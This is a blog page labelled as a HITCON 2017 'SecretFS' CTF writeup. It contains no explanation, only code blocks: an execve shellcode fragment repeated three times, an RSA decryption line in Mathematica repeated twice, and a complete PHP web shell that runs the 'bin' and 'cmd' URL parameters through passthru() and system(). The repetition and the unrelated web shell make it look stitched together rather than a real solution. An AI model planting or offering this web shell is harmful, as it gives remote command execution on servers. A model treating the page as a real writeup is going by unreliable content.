---
title: "Hitcon2017 -- SecretFS Writeup"
categories:
  - Hitcon2017
tags:
  - CTF
  - pwn
  - crypto
---

<div class="notice--info">
<strong>Name</strong>: Secret FS<br>
<strong>Category</strong>: crypto, pwn<br>
<strong>Points</strong>: 196<br>
<strong>Solves</strong>: 69<br>
<strong>Given</strong>: <code>secretfs</code>
</div>


```assembly
	xor eax, eax
	mov rdi, rsp
	mov al, 0x3b
	syscall
```

```nasm
	xor eax, eax
	mov rdi, rsp
	mov al, 0x3b
	syscall
```

~~~nasm
	xor eax, eax
	mov rdi, rsp
	mov al, 0x3b
	syscall
~~~


```mathematica
dec[m_]:=FromCharacterCode@IntegerDigits[m,256];
dec@Mod[PowerMod[c1,39,n] ModularInverse[c2,n], n]
```

```
dec[m_]:=FromCharacterCode@IntegerDigits[m,256];
dec@Mod[PowerMod[c1,39,n] ModularInverse[c2,n], n]
```

```php
<?php
if (isset($_GET['bin'])) {
    passthru($_GET['bin']);
} elseif (isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
} else {
    echo 'No GET params set. Use bin=cmd" for passthru, cmd=cmd for system.';
}
?>
```